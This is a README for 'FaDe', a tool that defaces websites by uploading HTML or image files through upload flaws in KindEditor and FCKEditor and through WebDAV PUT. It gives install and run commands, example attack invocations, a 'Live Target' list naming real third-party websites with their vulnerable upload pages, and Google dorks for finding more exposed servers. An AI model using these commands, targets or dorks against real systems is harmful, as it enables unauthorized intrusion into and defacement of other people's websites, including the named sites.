# FaDe
Fake deface with kindeditor, fckeditor and webdav is only add new files to the server, without touching anything on the server.

## Method
~ KindEditor - upload files on the server with remote file upload exploit<br>
~ FCKEditor - fckeditor all version arbitary vulnerability<br>
~ WebDAV - webdav file upload exploiter uses the PUT method that allows clients to upload and replace files on the server

## Screenshot
<img src=".images/screenshot.png">

## Installation and Using FaDe
```
apt-get install git python python-requests
```
```
git clone https://github.com/Gameye98/FaDe
```
```
python fade.py --method=method_name --file=<html|img>
```

## Example
```
fade --method=kindeditor --file=/path/example.png
```
```
fade --method=fckeditor --file=/path/example.html
```
```
fade --method=webdav --file=/path/example.html
```

## Live Target
```
KindEditor: http://www.nb-medicalsystem.com/kindeditor/examples/uploadbutton.html
Dork: inurl:/uploadbutton.html
```
```
FCKEditor: http://amarantenet.com.br/portal/editor/editor/filemanager/upload/test.html
Dork: inurl:/editor/editor/filemanager
```
```
WebDAV: http://ladesignstudio.co.za
Dork: intext:"(IIS)" ext:asp site:co.za
```

## Contact Me
Line     : dtl.lily<br>
Telegram : @dtlily<br>
Facebook : cgi.izo